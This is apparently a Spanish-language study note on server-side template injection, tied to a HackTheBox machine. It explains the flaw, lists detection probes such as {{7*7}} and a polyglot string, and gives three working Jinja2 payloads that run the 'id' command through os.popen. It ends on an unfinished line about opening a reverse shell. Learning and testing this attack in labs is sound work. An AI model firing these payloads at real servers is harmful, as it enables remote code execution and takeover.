Una inyección de plantilla del lado del servidor ocurre cuando un atacante puede usar la sintaxis de plantilla nativa para inyectar una carga útil maliciosa en una plantilla, que luego se ejecuta en el lado del servidor.

Los motores de plantillas están diseñados para generar páginas web combinando plantillas fijas con datos volátiles. Los ataques de inyección de plantillas del lado del servidor pueden ocurrir cuando la entrada del usuario se concatena directamente en una plantilla, en lugar de pasarla como datos. Esto permite a los atacantes inyectar directivas de plantillas arbitrarias para manipular el motor de plantillas, lo que a menudo les permite tomar el control total del servidor.

## Detencion

Como con cualquier vulnerabilidad, el primer paso hacia la explotación es poder encontrarla. Tal vez el enfoque inicial más simple sea probar la plantilla mediante la inyección de una secuencia de caracteres especiales que se usan comúnmente en las expresiones de la plantilla, como el políglota ${{<%%'"}}%\.
Para verificar si el servidor es vulnerable, debe detectar las diferencias entre la respuesta con datos regulares sobre el parámetro y la carga útil dada.

```python
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
```

Exploit 

```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
```

[Hacer una revers-shell a raiz de esta vulnerabilidad

Maquina de HackTheBox